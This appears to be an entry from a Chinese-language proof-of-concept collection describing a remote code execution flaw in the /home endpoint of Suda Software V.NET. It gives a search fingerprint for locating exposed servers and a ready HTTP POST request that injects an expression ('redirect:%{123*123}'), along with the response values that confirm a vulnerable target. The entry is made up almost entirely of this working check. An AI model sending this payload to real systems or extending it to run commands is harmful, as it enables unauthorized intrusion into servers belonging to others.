﻿# 速达软件 V.NET home RCE

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：速达软件 V.NET hoem接口处存在RCE漏洞，恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。 

> 漏洞特征：body="速达软件技术（广州）有限公司"||app="速达软件-公司产品"

> 验证脚本：HTTP

```
POST /home HTTP/1.1
Content-type: application/x-www-form-urlencoded

redirect:%25{123*123}
```

> 响应代码特征：302

> 响应内容特征：15129

> 上传文件定位：

> 验证文件来源：速达软件 V.NET home RCE.poc

